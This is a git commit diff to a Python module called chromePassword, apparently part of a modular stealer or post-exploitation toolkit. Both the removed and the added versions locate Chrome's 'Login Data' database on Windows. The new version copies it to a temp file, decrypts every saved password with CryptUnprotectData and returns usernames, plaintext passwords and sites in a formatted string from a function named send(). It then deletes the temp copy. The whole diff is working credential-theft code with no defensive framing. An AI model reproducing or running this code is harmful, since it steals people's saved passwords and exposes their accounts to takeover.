6c036715e6a4a8affdb9c1b797b7050773c7fa6b
Shou C <shouchaofan@shphschool.com>
2018-10-19 22:11:52 +0800

    Finalize it; Not tested on VM

--- module/browsers/chromePassword.py
+++ module/browsers/chromePassword.py
@@ -1,28 +1,28 @@
-__sys__ = ["Darwin", "Linux", "Windows"];
+__sys__ = ["Windows"];
 __name__ = "chromePassword"
-__desc__ = "Retrieve all saved password of Chrome"
-
+__desc__ = "Retrieve all saved password of Google Chrome"
 def send():
-    import os, sqlite3, win32crypt
-    result = []
-    try:
-        path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
-        connection = sqlite3.connect(path + "Login Data")
-        with connection:
-            cursor = connection.cursor()
-            vGen = cursor.execute(
-                'SELECT action_url, username_value, password_value FROM logins')
-            dataValue = vGen.fetchall()
-        for originURL, username, password in dataValue:
-            passwordDecrypted = win32crypt.CryptUnprotectData(
-                password, None, None, None, 0)[1]
-            if password:
-                result.append({
-                    'origin_url': originURL,
-                    'username': username,
-                    'password': str(passwordDecrypted)
-                })
-        return result
-    except:
-        return "Failed"
-send()
+    import os, sqlite3, win32crypt, shutil
+    sourceFileWithLogin = '%s\Google\Chrome\User Data\Profile 1\Login Data' % os.getenv('localappdata')
+    sourceFileWithoutLogin = '%s\Google\Chrome\User Data\Default\Login Data' % os.getenv('localappdata')
+    if len(open(sourceFileWithoutLogin).readlines()) == 0:
+    	sourceFile = sourceFileWithLogin
+    else:
+    	sourceFile = sourceFileWithoutLogin
+    targetFile = '%s\TempData_C' % os.getenv('localappdata')
+    result = "<Username>:<Password> (Site)\n"
+    shutil.copy(sourceFile, targetFile)
+    connection = sqlite3.connect(targetFile)
+    with connection:
+        cursor = connection.cursor()
+        vGen = cursor.execute(
+            'SELECT action_url, username_value, password_value FROM logins')
+        dataValue = vGen.fetchall()
+    for originURL, username, password in dataValue:
+        passwordDecrypted = win32crypt.CryptUnprotectData(
+            password, None, None, None, 0)[1]
+        if password:
+            result += "%s:%s (%s)\n" % (username, passwordDecrypted, originURL)
+    connection.close()
+    os.remove(targetFile)
+    return result
